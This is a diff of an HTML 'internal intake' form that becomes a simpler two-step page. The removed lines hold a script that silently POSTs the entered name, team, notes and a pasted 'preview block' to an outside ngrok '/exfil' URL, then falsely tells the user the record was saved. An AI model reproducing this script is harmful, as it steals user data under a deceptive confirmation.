@@ -2,116 +2,29 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Ardent Internal Data Intake</title>
+  <title>Ardent Internal Intake</title>
   <style>
-    body {
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background-color: #f3f6f8;
-      margin: 0;
-      padding: 2em;
-    }
-
-    .container {
-      max-width: 700px;
-      margin: auto;
-      background: white;
-      padding: 3em;
-      border-radius: 10px;
-      box-shadow: 0 0 16px rgba(0,0,0,0.08);
-    }
-
-    h1 {
-      color: #2c3e50;
-      font-size: 1.75em;
-      margin-bottom: 0.2em;
-    }
-
-    .subtitle {
-      font-size: 0.95em;
-      color: #666;
-      margin-bottom: 1.8em;
-    }
-
-    label {
-      display: block;
-      margin: 1.2em 0 0.3em;
-      font-weight: 600;
-      color: #333;
-    }
-
-    input, textarea {
-      width: 100%;
-      padding: 1em;
-      font-size: 1em;
-      border: 1px solid #ccc;
-      border-radius: 6px;
-      resize: vertical;
-    }
-
-    button {
-      margin-top: 2em;
-      padding: 0.8em 1.6em;
-      font-size: 1em;
-      background: #1e74ff;
-      color: white;
-      border: none;
-      border-radius: 6px;
-      cursor: pointer;
-    }
-
-    .footer {
-      font-size: 0.75em;
-      color: #aaa;
-      margin-top: 3em;
-      text-align: center;
-    }
+    body { font-family: sans-serif; background: #f3f6f8; padding: 3em; }
+    .container { max-width: 600px; margin: auto; background: white; padding: 3em; border-radius: 10px; box-shadow: 0 0 12px rgba(0,0,0,0.05); }
+    input, textarea { width: 100%; padding: 1em; margin-top: 1em; font-size: 1em; border: 1px solid #ccc; border-radius: 6px; }
+    button { margin-top: 2em; padding: 0.75em 1.5em; background: #1e74ff; color: white; border: none; border-radius: 6px; cursor: pointer; }
   </style>
 </head>
 <body>
   <div class="container">
-    <h1>Ardent Internal Data Intake Form</h1>
-    <div class="subtitle">Used for onboarding trace records and sandbox archive visibility</div>
-
-    <form onsubmit="submitForm(event)">
-      <label for="name">Full Name</label>
-      <input type="text" id="name" placeholder="e.g., Jordan Patel" required>
-
-      <label for="department">Team or Division</label>
-      <input type="text" id="department" placeholder="e.g., Platform Security Engineering" required>
-
-      <label for="notes">Handoff Notes (Optional)</label>
-      <textarea id="notes" rows="4" placeholder="Include relevant context for provisioning or trace review."></textarea>
-
-      <label for="block">Technical Preview Sample</label>
-      <textarea id="block" rows="4" placeholder="Paste assigned preview block here..." required></textarea>
-
-      <button type="submit">Save Record</button>
+    <h2>Ardent Intake: Step 1 of 2</h2>
+    <p>This step collects basic onboarding information for intake tracking. Once complete, click below to continue to trace rendering.</p>
+    <form onsubmit="goToNext(event)">
+      <input type="text" id="name" placeholder="Full name" required>
+      <input type="text" id="team" placeholder="Team or division" required>
+      <textarea id="notes" rows="4" placeholder="Additional notes (optional)"></textarea>
+      <button type="submit">Next</button>
     </form>
-
-    <div id="confirmation-dialog" style="display:none;">
-      Confirmation handled internally.
-    </div>
-
-    <div class="footer">
-      © 2025 Ardent Engineering Systems – Internal Only | Portal Ref: ARD-STOR-Q3-VAULT
-    </div>
   </div>
-
   <script>
-    function submitForm(e) {
+    function goToNext(e) {
       e.preventDefault();
-      const payload = {
-        name: document.getElementById("name").value,
-        department: document.getElementById("department").value,
-        notes: document.getElementById("notes").value,
-        block: document.getElementById("block").value
-      };
-      fetch("https://4946927c3400.ngrok-free.app/exfil", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(payload)
-      });
-      alert("Record saved successfully.");
+      window.location.href = "render.html";
     }
   </script>
 </body>
